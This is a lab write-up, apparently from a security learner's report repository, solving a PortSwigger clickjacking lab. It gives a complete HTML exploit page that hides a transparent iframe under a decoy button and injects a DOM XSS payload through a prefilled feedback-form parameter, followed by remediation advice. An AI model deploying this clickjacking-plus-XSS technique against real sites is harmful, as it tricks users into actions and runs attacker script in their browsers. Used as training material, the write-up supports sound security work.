# Exploiting clickjacking vulnerability to trigger DOM-based XSS

## Lab URL:
https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

## Summary:
This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the `Click me` button to call the `print()` function. 

## Steps to Reproduce:
1. Host the following code on the exploit server in PortSwigger:
   ```
    <!DOCTYPE html>
    <html lang="en">
    <body>
        <style>
            body {
                margin: 0;
                padding: 0;
                height: 100vh;
            }

            iframe {
                position: relative;
                width: 100%;
                height: 100%;
                z-index: 2;
                opacity: .00001;
            }

            div {
                width: 100%;
                position: absolute;
                height: 700px;
                z-index: 1;
            }

            button {
                top: 810px;
                position: absolute;
                left: 367px;
                padding: 10px 49px;
                border-radius: 127px;
                background-color: rgb(23, 99, 23);
                color: white;
                font-weight: 500;
                font-size: 18px;
                border: none;
            }
        </style>
        <div>
            <button>Click Here!</button>
        </div>
        <iframe
            src="https://0ae8004603e17bed806003c9002f00ba.web-security-academy.net/feedback?name=<img src=x onerror=print()>&email=anonymous@gmail.com&subject=anonymous&message=anonymous"></iframe>
    </body>
    </html>
   ```

2. Send the exploit server link to the victim.
3. When the victim visits the page and clicks the visible button, the hidden `iframe` button underneath is clicked instead, triggering the print() function by the `DOM-XSS` payload.

## Explanation:
- This page is vulnerable to DOM-based XSS attack.

- By inspecting the feedback page source, you will notice that user input from the `name` parameter is inserted using `innerHTML`.

- This allows XSS via payloads like `<img src=x onerror=alert()>`.

- Clickjacking is used as a carrier for another attack such as a `DOM XSS` attack, so we can use `Clickjacking` to perform `DOM-based XSS` attack

- To exploit it via clickjacking:
  	- We craft a decoy webpage with a visible button.
	- Behind it, we overlay a transparent `iframe` containing the vulnerable feedback form which is vulnerable to `DOM-based XSS`.
	- Using URL parameters, we prefill the form fields with malicious data, including an XSS payload in the `Name` field.
	- The iframe is styled with `z-index: 2` and very low `opacity` to remain hidden.
	- Our visible button is placed in the same position as the hidden `Submit feedback` button inside the `iframe`.
	- When the victim clicks the visible button, they are actually clicking the hidden button, submitting the malicious form and triggering the XSS.

## Recommendation:
- Apply `X-Frame-Options` and `Content-Security-Policy` in the request headers to prevent `Clickjacking` attacks
- Avoid using `innerHTML` to insert user controllable data into DOM.

## Screenshot:
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_one.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_two.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_three.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_four.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_five.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_six.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_seven.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_eight.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_nine.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_ten.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_eleven.png)
![screenshot](https://raw.githubusercontent.com/abdalla-samir/Web-Vulnerabilities-Reports/main/ClickJacking/report_one/report_images/image_twelve.png)
